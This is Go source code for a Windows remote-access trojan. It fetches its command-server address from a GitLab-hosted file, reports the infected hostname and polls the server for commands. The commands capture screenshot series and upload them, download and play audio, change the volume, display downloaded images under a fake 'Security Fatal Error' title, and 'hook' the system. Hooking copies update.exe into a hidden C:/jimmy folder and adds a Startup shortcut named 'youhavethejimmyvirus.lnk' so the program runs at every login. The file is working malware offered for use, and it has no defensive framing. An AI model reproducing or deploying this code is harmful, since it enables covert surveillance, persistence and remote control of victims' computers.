package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"image"
	_ "image/gif"
	_ "image/jpeg"
	"image/png"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/ebitengine/oto/v3"
	"github.com/go-ole/go-ole"
	"github.com/go-ole/go-ole/oleutil"
	"github.com/gonutz/wui/v2"
	"github.com/hajimehoshi/go-mp3"
	"github.com/itchyny/volume-go"
	"github.com/vova616/screenshot"
)

var serverIp string = "unknown"
var userInput string = ""
var mutex sync.Mutex
var audioCtx *oto.Context
var readyChan <-chan struct{}
var screenshotStatus bool = false

func fetchTunnelURL() string {
	resp, err := http.Get("https://gitlab.com/Plexisity1/tunnel-url/-/raw/main/tunnel-url.txt?t=" + strconv.FormatInt(time.Now().Unix(), 10))
	if err != nil {
		fmt.Println("Error fetching gist:", err)
		return ""
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading gist:", err)
		return ""
	}

	return strings.TrimSpace(string(body))
}

func displayImageNative(imgPath, durationSec string) error {
	secs, err := strconv.Atoi(durationSec)
	if err != nil {
		return fmt.Errorf("invalid duration: %w", err)
	}

	// 1. Open and decode image with standard Go library
	f, err := os.Open(imgPath)
	if err != nil {
		return fmt.Errorf("open file error: %w", err)
	}
	defer f.Close()

	decodedImg, _, err := image.Decode(f)
	if err != nil {
		return fmt.Errorf("decode image error: %w", err)
	}

	// 2. Convert to wui image
	wuiImg := wui.NewImage(decodedImg)
	bounds := wuiImg.Bounds()

	// 3. Setup window matching image dimensions
	window := wui.NewWindow()
	window.SetTitle("Security Fatal Error")
	window.SetInnerSize(bounds.Width, bounds.Height)

	// 4. Setup paintbox & drawing callback
	paintBox := wui.NewPaintBox()
	paintBox.SetBounds(0, 0, bounds.Width, bounds.Height)
	paintBox.SetOnPaint(func(c *wui.Canvas) {
		// Draw full source image at coordinates (0, 0)
		c.DrawImage(wuiImg, bounds, 0, 0)
	})
	window.Add(paintBox)

	// 5. Timer to close window automatically
	time.AfterFunc(time.Duration(secs)*time.Second, func() {
		window.Close()
	})

	// 6. Run native Win32 message loop (works inside VMs without OpenGL)
	window.Show()

	return nil
}

func ss() {
	img, err := screenshot.CaptureScreen()
	if err != nil {
		fmt.Println("Error capturing screenshot:", err)
	}
	f, err := os.Create("./ss.webp")
	if err != nil {
		fmt.Println("Error creating file:", err)
		panic(err)
	}
	err = png.Encode(f, img)
	if err != nil {
		fmt.Println("Error encoding PNG:", err)
		panic(err)
	}
	f.Close()
}

func setVol(newVol int) string {
	if newVol < 0 {
		fmt.Println("Volume must be between 0 and 100")
		return "Invalid volume level"
	}
	if newVol > 100 {
		fmt.Println("Volume must be between 0 and 100")
		return "Invalid volume level"
	}

	vol, err := volume.GetVolume()

	err = volume.Unmute()
	if err != nil {
		fmt.Println("unmute failed:", err)
	}

	if err != nil {
		fmt.Println("get volume failed:", err)
	}
	fmt.Printf("current volume: %d\n", vol)

	err = volume.SetVolume(newVol)

	if err != nil {
		fmt.Println("set volume failed:", err)
	}
	fmt.Printf("set volume success\n")

	return strconv.Itoa(vol)
}

func sendFile(filePath string, mediaType string) string {
	Path := filePath
	file, err := os.Open(Path)
	if err != nil {
		panic(err)
	}
	defer file.Close()

	// Prepare the network request targeting the cloudflare ip
	targetURL := serverIp + "/upload"
	req, err := http.NewRequest("POST", targetURL, file)
	if err != nil {
		panic(err)
	}

	// Attach metadata instructions in the headers
	req.Header.Set("X-Media-Type", mediaType)
	req.Header.Set("X-File-Name", Path)

	// Dispatch the stream
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	os.Remove(Path)
	var output string = "Server Response Status: " + resp.Status
	return (output)
}

// receive file from server
func downloadFile(fileName string) error {
	resp, err := http.Get(serverIp + "/download?file=" + fileName)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	out, err := os.Create(fileName)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, resp.Body)
	return err
}

func fetchCommand() string {

	resp, err := http.Get(serverIp + "/get-command")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return "idle"
	}

	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "idle"
	}

	return string(bodyBytes)
}

// command to play sounds the server defines built for mp3
func playSound(fileName string) {
	file, err := os.Open(fileName)
	if err != nil {
		panic("opening sound.mp3 failed: " + err.Error())
	}

	decodedMp3, err := mp3.NewDecoder(file)
	if err != nil {
		panic("mp3.NewDecoder failed: " + err.Error())
	}

	player := audioCtx.NewPlayer(decodedMp3)
	player.Play()

	for player.IsPlaying() {
		time.Sleep(50 * time.Millisecond)
	}
	file.Close()
	err = os.Remove(fileName)
	if err != nil {
		fmt.Println("Error deleting sound file:", err)
	}

	fmt.Println("Sound playback started. Deleting sound file...")
	reportProgress(serverIp, "Sound playback finished.")
}

func reportProgress(serverURL string, report string) {
	payload, _ := json.Marshal(map[string]string{"progress": report})
	resp, err := http.Post(serverURL+"/progress", "application/json", bytes.NewReader(payload))
	if err != nil {
		fmt.Println("Couldn't report progress:", err)
		return
	}
	resp.Body.Close()
}

func setHidden(path string) error {
	filenameW, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	err = syscall.SetFileAttributes(filenameW, syscall.FILE_ATTRIBUTE_HIDDEN)
	if err != nil {
		return err
	}

	return nil
}

func CopyFile(src, dst string) error {
	// Open the source file
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	// Create the destination file
	destinationFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	// Copy the content
	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	// Ensure data is flushed to disk
	return destinationFile.Sync()
}

func hookSystem(src string) error {
	// Make the directory and hide it
	err := os.Mkdir("C:/jimmy", 0755)
	if err != nil {
		fmt.Println(err)
	}

	err = setHidden("C:/jimmy")
	if err != nil {
		fmt.Println(err)
	}

	fmt.Println("Folder created and hidden successfully.")
	reportProgress(serverIp, "Folder created and hidden successfully.")

	err = CopyFile("update.exe", "C:/jimmy/update.exe")
	if err != nil {
		fmt.Println("File copy failed: %v", err)
	}
	fmt.Println("File copied successfully!")
	reportProgress(serverIp, "File copied successfully!")

	// Startup Shortcut (final step)
	err = ole.CoInitializeEx(0, ole.COINIT_APARTMENTTHREADED|ole.COINIT_SPEED_OVER_MEMORY)
	if err != nil {
		return err
	}
	defer ole.CoUninitialize()

	oleShellObject, err := oleutil.CreateObject("WScript.Shell")
	if err != nil {
		return err
	}
	defer oleShellObject.Release()

	wshell, err := oleShellObject.QueryInterface(ole.IID_IDispatch)
	if err != nil {
		return err
	}
	defer wshell.Release()

	// Get Startup folder: shell.SpecialFolders("Startup")
	startupVar, err := oleutil.GetProperty(wshell, "SpecialFolders")
	if err != nil {
		return err
	}
	specialFolders := startupVar.ToIDispatch()
	defer specialFolders.Release()

	startupPathVar, err := oleutil.CallMethod(specialFolders, "Item", "Startup")
	if err != nil {
		return err
	}
	startupPath := startupPathVar.ToString()
	startupPathVar.Clear()

	dst := filepath.Join(startupPath, "youhavethejimmyvirus.lnk")

	cs, err := oleutil.CallMethod(wshell, "CreateShortcut", dst)
	if err != nil {
		return err
	}
	idispatch := cs.ToIDispatch()
	defer idispatch.Release()

	_, err = oleutil.PutProperty(idispatch, "TargetPath", src)
	if err != nil {
		return err
	}

	_, err = oleutil.PutProperty(idispatch, "WorkingDirectory", "C:/jimmy")
	if err != nil {
		return err
	}

	_, err = oleutil.CallMethod(idispatch, "Save")
	if err != nil {
		return err
	}
	reportProgress(serverIp, "Startup shortcut created successfully!")
	return nil
}

func screenshotLoop(amount string) {
	i := 0
	fmt.Println("Using numeric value")
	n, err := strconv.Atoi(amount)
	if err != nil {
		fmt.Println(err)
	}
	screenshotStatus = true
	for i < n {
		ss()
		output := sendFile("./ss.webp", "image")
		fmt.Println(output)
		time.Sleep(500 * time.Millisecond)
		fmt.Println(i)
		i++
	}
	screenshotStatus = false
}

func main() {
	op := &oto.NewContextOptions{}
	op.SampleRate = 44100
	op.ChannelCount = 2
	op.Format = oto.FormatSignedInt16LE

	var err error
	audioCtx, readyChan, err = oto.NewContext(op)
	if err != nil {
		panic(err)
	}
	<-readyChan

	fmt.Println("Finding tunnel URL...")
	tunnelURL := fetchTunnelURL()
	mutex.Lock()
	serverIp = tunnelURL
	mutex.Unlock()

	fmt.Println("Tunnel URL fetched:", tunnelURL)
	fmt.Println("Starting command client...")

	hostname, err := os.Hostname()
	if err != nil {
		fmt.Println("Error getting hostname:", err)
		hostname = "unknown"
	}

	reportProgress(serverIp, "Client: "+hostname+" has joined the network")

	for true {
		userInput = fetchCommand()
		command := strings.Fields(userInput)
		time.Sleep(100 * time.Millisecond)

		fmt.Printf("Received command from server: %s\n", userInput)
		if len(command) != 0 {
			switch command[0] {

			case "idle":
				time.Sleep(5 * time.Second)

			case "ss":
				fmt.Println("Taking screenshot...")
				if screenshotStatus {
					fmt.Println("Screenshot loop already running. Ignoring command.")
					break
				}
				go screenshotLoop(command[1])

			case "sound":
				fmt.Println("Downloading sound file...")
				err := downloadFile(command[1])
				if err != nil {
					fmt.Println("Error downloading sound file:", err)
					break
				}
				fmt.Println("Sound file downloaded successfully.")
				fmt.Println("Playing sound...")
				go playSound(command[1])

			case "vol":
				if len(command) < 2 {
					fmt.Println("Invalid usage", userInput)
					fmt.Println("Hint try vol (number)")
					userInput = "idle"
					break
				}
				volumeLevel, err := strconv.Atoi(command[1])
				if err != nil {
					fmt.Println("Invalid volume level:", command[1])
					userInput = "idle"
					break
				}
				output := setVol(volumeLevel)
				fmt.Println(output)
				reportProgress(serverIp, "Volume set from "+output+" to "+command[1])

			case "hook":
				fmt.Println("Hooking system...")

				err := hookSystem("C:/jimmy/update.exe")
				if err != nil {
					fmt.Println("Error hooking system:", err)
				} else {
					fmt.Println("System hooked successfully.")
				}

			case "img":
				fmt.Println("Downloading sound file...")
				err := downloadFile(command[1])
				if err != nil {
					fmt.Println("Error downloading sound file:", err)
					reportProgress(serverIp, "Error downloading image")
					break
				}

				fmt.Println("Displaying img")
				reportProgress(serverIp, "Showing image...")
				// Run your background work asynchronously
				fmt.Println("Displaying img")

				if err := displayImageNative(command[1], command[2]); err != nil {
					fmt.Println("Error:", err)
					err = os.Remove(command[1])
					if err != nil {
						fmt.Println("Error deleting sound file:", err)
					}
					return
				}
				err = os.Remove(command[1])
				if err != nil {
					fmt.Println("Error deleting sound file:", err)
				}

				fmt.Println("Image closed; the program continues.")
				reportProgress(serverIp, "Image shown")

			default:
				time.Sleep(500 * time.Millisecond)

				if strings.HasPrefix(userInput, "error") || strings.HasPrefix(userInput, "Error") {
					mutex.Lock()
					tunnelURL = "unknown"
					mutex.Unlock()

					fmt.Println("Server down, looking for new tunnel URL...")
					time.Sleep(1 * time.Second)
					tunnelURL = fetchTunnelURL()

					if serverIp != tunnelURL {
						mutex.Lock()
						serverIp = tunnelURL
						mutex.Unlock()
						fmt.Println("Tunnel URL updated:", tunnelURL)
						reportProgress(serverIp, "Client: "+hostname+" has joined the network")
					} else {
						fmt.Println("Tunnel URL unchanged:", tunnelURL)
					}

				}

			}
		}
	}
}
